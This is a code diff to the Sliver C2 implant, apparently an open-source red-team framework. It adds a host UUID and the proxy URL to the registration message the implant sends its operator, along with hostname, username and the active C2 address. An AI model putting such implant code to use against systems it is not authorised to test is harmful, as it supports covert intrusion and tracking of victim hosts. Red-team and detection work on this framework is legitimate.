@@ -36,16 +36,16 @@ import (
 
 	"log"
 
-	consts "github.com/bishopfox/sliver/implant/sliver/constants"
-	"github.com/bishopfox/sliver/implant/sliver/handlers"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 
 	// {{if eq .Config.GOOS "windows"}}
 	"github.com/bishopfox/sliver/implant/sliver/priv"
 	"github.com/bishopfox/sliver/implant/sliver/syscalls"
-
 	// {{end}}
 
+	consts "github.com/bishopfox/sliver/implant/sliver/constants"
+	"github.com/bishopfox/sliver/implant/sliver/handlers"
+	"github.com/bishopfox/sliver/implant/sliver/hostuuid"
 	"github.com/bishopfox/sliver/implant/sliver/limits"
 	"github.com/bishopfox/sliver/implant/sliver/pivots"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
@@ -264,9 +264,17 @@ func getRegisterSliver() *sliverpb.Envelope {
 			filename = "<< error >>"
 		}
 	}
+
+	// Retrieve UUID
+	uuid := hostuuid.GetUUID()
+	// {{if .Config.Debug}}
+	log.Printf("Uuid: %s", uuid)
+	// {{end}}
+
 	data, err := proto.Marshal(&sliverpb.Register{
 		Name:              consts.SliverName,
 		Hostname:          hostname,
+		Uuid:              uuid,
 		Username:          currentUser.Username,
 		Uid:               currentUser.Uid,
 		Gid:               currentUser.Gid,
@@ -277,6 +285,7 @@ func getRegisterSliver() *sliverpb.Envelope {
 		Filename:          filename,
 		ActiveC2:          transports.GetActiveC2(),
 		ReconnectInterval: uint32(transports.GetReconnectInterval() / time.Second),
+		ProxyURL:          transports.GetProxyURL(),
 	})
 	if err != nil {
 		// {{if .Config.Debug}}
